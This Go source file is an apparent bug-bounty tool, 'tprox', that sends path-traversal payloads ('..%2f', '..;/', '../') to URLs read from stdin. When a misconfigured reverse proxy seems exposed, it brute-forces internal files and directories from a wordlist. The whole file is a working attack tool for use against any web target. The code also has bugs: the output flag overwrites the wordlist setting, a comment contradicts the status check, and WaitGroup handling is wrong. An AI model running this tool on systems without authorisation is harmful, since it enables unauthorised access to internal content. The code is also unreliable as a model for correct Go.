package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
)

// Our global variables
var (
	wordlist string
	output   string
	threads  int
)

// The payloads to test
var payloads = [3]string{"..%2f", "..;/", "../"}

func getBanner() string {

	str := `

 
  __                   
 / /____  _______ __ __
/ __/ _ \/ __/ _ \\ \ /
\__/ .__/_/  \___/_\_\   v0.1-dev
   /_/                  
   
   github.com/ethicalhackingplayground

	`

	return str
}

// Return a true or false if the args are valid.
func parseArgs() bool {

	// Print the banner
	fmt.Println(getBanner())

	flag.StringVar(&wordlist, "w", "", "The wordlist to use against a valid endpoint to traverse")
	flag.StringVar(&wordlist, "o", "", "Output the results to a file")
	flag.IntVar(&threads, "t", 10, "The number of concurrent requests")
	flag.Parse()
	if wordlist == "" {
		flag.PrintDefaults()
		return false
	} else {
		return true
	}
}

// Parse the arguments and run the test function.
func main() {

	if parseArgs() {
		fmt.Println("[>] Finding misconfigured proxies ")
		fmt.Println("")
		run()
	}
}

// This is where all the path traversal functions begin.
func run() {

	urls := make(chan string)

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			// Url channel loop
			for url := range urls {
				for _, traversal := range payloads {
					testTraversal(&wg, url, traversal)
				}

			}
			wg.Done()
		}()

	}

	uscanner := bufio.NewScanner(os.Stdin)
	for uscanner.Scan() {
		urls <- uscanner.Text()
	}

	close(urls)
	wg.Wait()
}

// Craft the new url to test, this works as the following.
// 1.) Input the Url to test
// 2.) Calculate the number of paths
// 3.) Append the payload the same number of times as the paths
func craftTestUrl(count int, url string, payload string) string {
	var traversal = ""
	for i := 0; i < count; i++ {
		traversal = traversal + payload
	}

	return url + "/" + traversal + "/"

}

// Test for proxy traversal attacks
func testTraversal(wg *sync.WaitGroup, url string, payload string) {

	client := http.Client{}

	// Get the test url
	paths := strings.Split(url, "/")
	pathCount := len(paths) - 2
	testUrl := craftTestUrl(pathCount, url, payload)

	// Get the response from the server to
	// Perform ongoing testing for proxy misconfigs
	req, err := http.NewRequest("GET", testUrl, nil)
	if err != nil {
		return
	}
	resp, err := client.Do(req)
	if err != nil {
		return
	}

	// Check if the page is a 404, if it is we may be in the root api
	// From here onwards we need to perform directory content discovery to
	// Find internal files or endpoints
	if resp.StatusCode == 400 {

		// Get the test url
		paths := strings.Split(url, "/")
		pathCount := len(paths) - 3
		testUrl := craftTestUrl(pathCount, url, payload)

		// Get the response from the server to
		// Perform ongoing testing for proxy misconfigs
		req, err := http.NewRequest("GET", testUrl, nil)
		if err != nil {
			return
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}

		if resp.StatusCode == 404 {
			fmt.Println("[-] Brutforcing proxy " + testUrl)

			// Start bruteforcing for files and directories
			words := make(chan string)

			for i := 0; i < threads; i++ {
				wg.Add(1)
				go func() {

					// wordlist brute channel loop
					for word := range words {
						bruteForDirAndFile(client, wg, url, testUrl, word)
					}
				}()
				wg.Done()
			}

			// Read in the wordlist list
			wordFile, err := os.Open(wordlist)
			if err != nil {
				return
			}

			wordBytes := bufio.NewScanner(wordFile)
			for wordBytes.Scan() {
				words <- wordBytes.Text()
			}
			close(words)

		}
	}
}

// Start the content discovery for files and directories
func bruteForDirAndFile(client http.Client, wg *sync.WaitGroup, url string, testUrl string, word string) {

	contentFound := testUrl + word
	contentNotFound := url + "/" + word
	resp1, err := http.Get(contentFound)
	if err != nil {
		return
	}

	resp2, err := http.Get(contentNotFound)
	if err != nil {
		return
	}
	if resp1.StatusCode == 200 {
		if resp2.StatusCode == 404 || resp2.StatusCode == 403 || resp2.StatusCode == 401 || resp2.StatusCode == 400 {
			fmt.Println("")
			fmt.Println("[*] Found something internal " + contentFound)
		}

	}

}
